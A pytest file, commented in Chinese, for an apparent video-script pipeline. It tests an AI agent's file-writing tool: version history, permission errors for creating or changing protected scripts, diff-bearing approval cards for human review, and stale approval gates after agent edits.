    """真实对拍（盘在才跑）：董香二期选题表写的「S01E09 依子送便当」在字幕里不存在，探病在 S01E05。"""
    from pipeline import paths

    if not (paths.DATA / "library" / "index" / "东京喰种_S01E09.json").exists():
        pytest.skip("外置盘未挂载")
    ctx = ToolContext(root=paths.ROOT)
    look = lambda **a: execute_tool("search_notes", {"source": "subs", "anime": "东京喰种", **a}, ctx)["result"]
    assert look(query="依子", episode="S01E09")["hits"] == []
    assert ("S01E05", "02:53") in {(h["ep"], h["time"]) for h in look(query="探病", limit=20)["hits"]}
    assert "08:27 从那之后雏实就和董香一起住了" in look(episode="S01E09")["transcript"]


def test_draft_history_keeps_previous_versions(tmp_path: Path) -> None:
    from pipeline.agent.tools import DRAFT_HISTORY_KEEP

    root = tmp_path
    ep = root / "data" / "episodes" / "01-hist"
    ep.mkdir(parents=True)
    hist = ep / "_agent" / "draft-history"
    write_episode_file(ep, "02-script.draft.md", "v0", root=root)
    assert not hist.exists(), "首次写入没有旧版可留"
    for i in range(1, DRAFT_HISTORY_KEEP + 3):
        write_episode_file(ep, "02-script.draft.md", f"v{i}", root=root)
    kept = sorted(hist.iterdir())
    assert len(kept) == DRAFT_HISTORY_KEEP
    assert kept[-1].read_text(encoding="utf-8") == f"v{DRAFT_HISTORY_KEEP + 1}"
    assert kept[0].read_text(encoding="utf-8") == "v2", "最旧的两份应被删"
    # 其它白名单文件不留底
    write_episode_file(ep, "07-titles.md", "a", root=root)
    write_episode_file(ep, "07-titles.md", "b", root=root)
    assert len(list(hist.iterdir())) == DRAFT_HISTORY_KEEP


def test_tools_import_stays_free_of_ml_deps() -> None:
    probe = (
        "import pipeline.agent.tools, sys; "
        "bad = [m for m in ('numpy', 'torch', 'sentence_transformers', 'pipeline.subindex') if m in sys.modules]; "
        "assert not bad, bad"
    )
    subprocess.run([sys.executable, "-c", probe], check=True)


# ---------------------------------------------------------------------------
# D47：agent 在人审批下改 02-script.md（只能改不能新建、草稿冻结、全量留底、卡上带 diff）
# ---------------------------------------------------------------------------


def _d47_ep(tmp_path: Path) -> tuple[Path, Path]:
    root = tmp_path
    ep = root / "data" / "episodes" / "01-d47"
    ep.mkdir(parents=True)
    return root, ep


def test_d47_script_cannot_be_created_by_agent(tmp_path: Path) -> None:
    root, ep = _d47_ep(tmp_path)
    with pytest.raises(PermissionError, match="还不存在"):
        write_episode_file(ep, "02-script.md", "# x", root=root)
    assert not (ep / "02-script.md").exists()


def test_d47_script_edit_keeps_every_previous_version(tmp_path: Path) -> None:
    from pipeline.agent.tools import DRAFT_HISTORY_KEEP

    root, ep = _d47_ep(tmp_path)
    (ep / "02-script.md").write_text("v0", encoding="utf-8")
    n = DRAFT_HISTORY_KEEP + 5  # 超过草稿的保留份数：定稿不修剪
    for i in range(1, n + 1):
        write_episode_file(ep, "02-script.md", f"v{i}", root=root)
    assert (ep / "02-script.md").read_text(encoding="utf-8") == f"v{n}"
    kept = sorted((ep / "_agent" / "script-history").iterdir())
    assert [k.read_text(encoding="utf-8") for k in kept] == [f"v{i}" for i in range(n)]
    assert all(k.name.endswith("-02-script.md") for k in kept)
    assert not (ep / "_agent" / "draft-history").exists()


def test_d47_draft_frozen_once_script_exists(tmp_path: Path) -> None:
    root, ep = _d47_ep(tmp_path)
    write_episode_file(ep, "02-script.draft.md", "机器初稿", root=root)
    (ep / "02-script.md").write_text("机器初稿", encoding="utf-8")
    with pytest.raises(PermissionError, match="基线"):
        write_episode_file(ep, "02-script.draft.md", "又改了", root=root)
    assert (ep / "02-script.draft.md").read_text(encoding="utf-8") == "机器初稿"


def test_d47_write_card_shows_diff_against_disk(tmp_path: Path) -> None:
    from pipeline.agent.status_card import render_approval_card

    _, ep = _d47_ep(tmp_path)
    # 与真实稿件同形：段落标题与配音行之间隔一个空行，上下文 2 行才带得出「改的是哪一段」
    (ep / "02-script.md").write_text("## 段落 1\n\n配音：旧句\n\n## 段落 2\n\n配音：不动\n", encoding="utf-8")
    card = render_approval_card(
        "write_episode_file",
        {"filename": "02-script.md", "content": "## 段落 1\n\n配音：新句\n\n## 段落 2\n\n配音：不动\n"},
        episode_dir=ep,
    )
    assert "│ 改动: +1 / -1 行" in card
    assert "│ -配音：旧句" in card and "│ +配音：新句" in card
    assert "│  ## 段落 1" in card
    assert "不动" not in card, "上下文只留 2 行，没改的段落正文不该铺进卡里"
    assert "改后封板失效" not in card and "已配音" not in card
    same = render_approval_card(
        "write_episode_file", {"filename": "02-script.md", "content": (ep / "02-script.md").read_text(encoding="utf-8")},
        episode_dir=ep,
    )
    assert "│ 改动: 与磁盘现版逐字相同" in same


def test_d47_write_card_truncates_long_diff_and_marks_stale_gates(tmp_path: Path) -> None:
    from pipeline.agent.status_card import CARD_DIFF_MAX_LINES, render_approval_card

    _, ep = _d47_ep(tmp_path)
    (ep / "02-script.md").write_text("\n".join(f"旧{i}" for i in range(100)) + "\n", encoding="utf-8")
    (ep / "02-diff.patch").write_text("x", encoding="utf-8")
    (ep / "03-audio").mkdir()
    (ep / "03-audio" / "manifest.json").write_text("{}", encoding="utf-8")
    card = render_approval_card(
        "write_episode_file",
        {"filename": "02-script.md", "content": "\n".join(f"新{i}" for i in range(100)) + "\n"},
        episode_dir=ep,
    )
    # 整篇替换：hunk 头 1 行 + 删 100 + 加 100 = 201 行 diff 正文
    assert f"另有 {201 - CARD_DIFF_MAX_LINES} 行 diff 未显示" in card
    assert "│ 改动: +100 / -100 行" in card
    danger = [ln for ln in card.splitlines() if "危险标记:" in ln][0]
    assert "改后封板失效，需重新封板" in danger and "已配音，改动段落需 tts --redo" in danger


def test_d47_agent_write_makes_sealed_gate_stale(tmp_path: Path) -> None:
    import os

    from pipeline.approvals import _gate_valid

    root, ep = _d47_ep(tmp_path)
    (ep / "02-script.draft.md").write_text("a\n", encoding="utf-8")
    (ep / "02-script.md").write_text("b\n", encoding="utf-8")
    (ep / "02-diff.patch").write_text("-a\n+b\n", encoding="utf-8")
    st = (ep / "02-script.md").stat()
    os.utime(ep / "02-diff.patch", ns=(st.st_atime_ns, st.st_mtime_ns + 1_000_000))
    assert _gate_valid(ep, "02.5")
    write_episode_file(ep, "02-script.md", "c\n", root=root)
    os.utime(ep / "02-script.md", ns=(st.st_atime_ns, st.st_mtime_ns + 2_000_000))  # 防同一时钟刻度
    assert not _gate_valid(ep, "02.5"), "agent 改了定稿，旧封板必须失效、人重新封板"


# ---------------------------------------------------------------------------
# D48：write_episode_file 的局部替换写法（edits）
# ---------------------------------------------------------------------------

_D48_SCRIPT = "## 段落 1\n\n配音：甲。\n\n## 段落 2\n\n配音：乙。\n\n## 段落 3\n\n配音：乙。丙。\n"


def _d48_ep(tmp_path: Path) -> tuple[Path, Path]:
    root, ep = _d47_ep(tmp_path)
    (ep / "02-script.md").write_text(_D48_SCRIPT, encoding="utf-8")
    return root, ep


def test_d48_edits_replace_unique_fragments_in_order(tmp_path: Path) -> None:
    root, ep = _d48_ep(tmp_path)
    ctx = ToolContext(scope="creative", episode_dir=ep, root=root, confirmed=True)
    out = execute_tool("write_episode_file", {"filename": "02-script.md", "edits": [
        {"old": "配音：甲。", "new": "配音：甲改。"},
        {"old": "配音：乙。丙。", "new": "配音：丙。"},  # 带上下文才唯一
    ]}, ctx)
    assert out["ok"] is True, out
    assert (ep / "02-script.md").read_text(encoding="utf-8") == (
        "## 段落 1\n\n配音：甲改。\n\n## 段落 2\n\n配音：乙。\n\n## 段落 3\n\n配音：丙。\n"
    )
    assert len(list((ep / "_agent" / "script-history").iterdir())) == 1, "edits 写入同样留底"


@pytest.mark.parametrize("args, why", [
    ({"edits": [{"old": "配音：乙。", "new": "x"}]}, "出现了 2 次"),
    ({"edits": [{"old": "配音：丁。", "new": "x"}]}, "找不到"),
    # 顺序语义：第 1 条把「甲」换掉后，第 2 条再找「甲」就找不到了
    ({"edits": [{"old": "配音：甲。", "new": "配音：丁。"}, {"old": "配音：甲。", "new": "y"}]}, "第 2 条 找不到"),
    ({"edits": [{"old": "", "new": "x"}]}, "old 为空"),
    ({"edits": []}, "非空数组"),
    ({"edits": [{"old": "配音：甲。"}]}, "两个字符串"),
    ({"content": "x", "edits": [{"old": "配音：甲。", "new": "x"}]}, "只能给一个"),
    ({}, "只能给一个"),
])
def test_d48_bad_edits_write_nothing(tmp_path: Path, args: dict, why: str) -> None:
    root, ep = _d48_ep(tmp_path)
    ctx = ToolContext(scope="creative", episode_dir=ep, root=root, confirmed=True)
    out = execute_tool("write_episode_file", {"filename": "02-script.md", **args}, ctx)
    assert out["ok"] is False and why in out["error"], out
    assert (ep / "02-script.md").read_text(encoding="utf-8") == _D48_SCRIPT
    assert not (ep / "_agent").exists()


def test_d48_edits_card_diff_is_what_will_be_written(tmp_path: Path) -> None:
    from pipeline.agent.status_card import render_approval_card

    _, ep = _d48_ep(tmp_path)
    card = render_approval_card(
        "write_episode_file",
        {"filename": "02-script.md", "edits": [{"old": "配音：甲。", "new": "配音：甲改。"}]},
        episode_dir=ep,
    )
    assert "│ 改动: +1 / -1 行" in card
    assert "│ -配音：甲。" in card and "│ +配音：甲改。" in card
